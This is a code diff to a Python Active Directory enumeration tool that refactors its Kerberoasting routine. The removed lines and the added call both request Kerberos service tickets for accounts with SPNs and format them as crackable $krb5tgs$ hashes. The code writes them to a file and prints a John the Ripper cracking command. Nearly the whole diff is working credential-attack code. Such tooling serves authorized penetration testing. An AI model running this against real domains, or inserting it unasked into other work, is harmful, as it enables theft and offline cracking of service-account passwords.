@@ -591,10 +591,11 @@ class EnumAD():
 
 
     def enumSPNUsers(self):
-        users_spn = {
-        }
-        user_tickets = {
-        }
+        from .attacks.kerberoast import kerberoast
+        kerberoaster = kerberoast.Kerberoast()
+
+        users_spn = {}
+        user_tickets = {}
 
         userDomain = self.domuser.split('@')[1]
 
@@ -603,62 +604,24 @@ class EnumAD():
             spns = json.loads(self.spn[idx].entry_to_json())
             users_spn[self.splitJsonArr(spns['attributes'].get('name'))] = self.splitJsonArr(spns['attributes'].get('servicePrincipalName')) 
             idx += 1    
-
-        # Get TGT for the supplied user
-        client = Principal(self.domuser, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-        try:
-            # We need to take the domain from the user@domain since it *could* be a cross-domain user
-            tgt, cipher, _, newSession = getKerberosTGT(client, '', userDomain, compute_lmhash(self.passwd), compute_nthash(self.passwd), None, kdcHost=None)
-
-            TGT = {}
-            TGT['KDC_REP'] = tgt
-            TGT['cipher'] = cipher
-            TGT['sessionKey'] = newSession
-    
-            for user, spn in users_spn.items():
-                if isinstance(spn, list):
-                    # We only really need one to get a ticket
-                    spn = spn[0]
-                else:
-                    try:
-                        # Get the TGS
-                        serverName = Principal(spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
-                        tgs, cipher, _, newSession = getKerberosTGS(serverName, userDomain, None, TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'])
-                        # Decode the TGS
-                        decoded = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
-                        # Get different encryption types
-                        if decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.rc4_hmac.value:
-                            entry = '$krb5tgs${0}$*{1}${2}${3}*${4}${5}'.format(constants.EncryptionTypes.rc4_hmac.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][:16].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
-                            user_tickets[spn] = entry
-                        elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
-                            entry = '$krb5tgs${0}${1}${2}$*{3}*${4}${5}'.format(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
-                            user_tickets[spn] = entry
-                        elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
-                            entry = '$krb5tgs${0}${1}${2}$*{3}*${4}${5}'.format(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][:-12].asOctets()).decode())
-                            user_tickets[spn] = entry
-                        elif decoded['ticket']['enc-part']['etype'] == constants.EncryptionTypes.des_cbc_md5.value:
-                            entry = '$krb5tgs${0}$*{1}${2}${3}*${4}${5}'.format(constants.EncryptionTypes.des_cbc_md5.value, user, decoded['ticket']['realm'], spn.replace(':', '~'), hexlify(decoded['ticket']['enc-part']['cipher'][:16].asOctets()).decode(), hexlify(decoded['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
-                            user_tickets[spn] = entry
-
-                    except KerberosError:
-                        # For now continue
-                        # TODO: Maybe look deeper into issue here
-                        continue
-
-            if len(user_tickets.keys()) > 0:
-                with open('{0}-spn-tickets'.format(self.server), 'w') as f:
-                    for key, value in user_tickets.items():
-                        f.write('{0}:{1}\n'.format(key, value))
-                if len(user_tickets.keys()) == 1:
-                    print('[ ' + colored('OK', 'yellow') +' ] Got and wrote {0} ticket for Kerberoasting. Run: john --format=krb5tgs --wordlist=<list> {1}-spn-tickets'.format(len(user_tickets.keys()), self.server))
-                else:
-                    print('[ ' + colored('OK', 'yellow') +' ] Got and wrote {0} tickets for Kerberoasting. Run: john --format=krb5tgs --wordlist=<list> {1}-spn-tickets'.format(len(user_tickets.keys()), self.server))
+        for user, spn in users_spn.items():
+            if isinstance(spn, list):
+                # We only really need one to get a ticket
+                spn = spn[0]
             else:
-                print('[ ' + colored('OK', 'green') +' ] Got {0} tickets for Kerberoasting'.format(len(user_tickets.keys())))
+                tickets = kerberoaster.roast(self.domuser, self.passwd, userDomain, user, spn)
+                user_tickets = { **user_tickets, **tickets }
 
-
-        except KerberosError as err:
-            print('[ ' + colored('ERROR', 'red') +' ] Kerberoasting failed with error: {0}'.format(err.getErrorString()[1]))
+        if len(user_tickets.keys()) > 0:
+            with open('{0}-spn-tickets'.format(self.server), 'w') as f:
+                for key, value in user_tickets.items():
+                    f.write('{0}:{1}\n'.format(key, value))
+            if len(user_tickets.keys()) == 1:
+                print('[ ' + colored('OK', 'yellow') +' ] Got and wrote {0} ticket for Kerberoasting. Run: john --format=krb5tgs --wordlist=<list> {1}-spn-tickets'.format(len(user_tickets.keys()), self.server))
+            else:
+                print('[ ' + colored('OK', 'yellow') +' ] Got and wrote {0} tickets for Kerberoasting. Run: john --format=krb5tgs --wordlist=<list> {1}-spn-tickets'.format(len(user_tickets.keys()), self.server))
+        else:
+            print('[ ' + colored('OK', 'green') +' ] Got {0} tickets for Kerberoasting'.format(len(user_tickets.keys())))
 
 
     def enumForCreds(self, ldapdump):
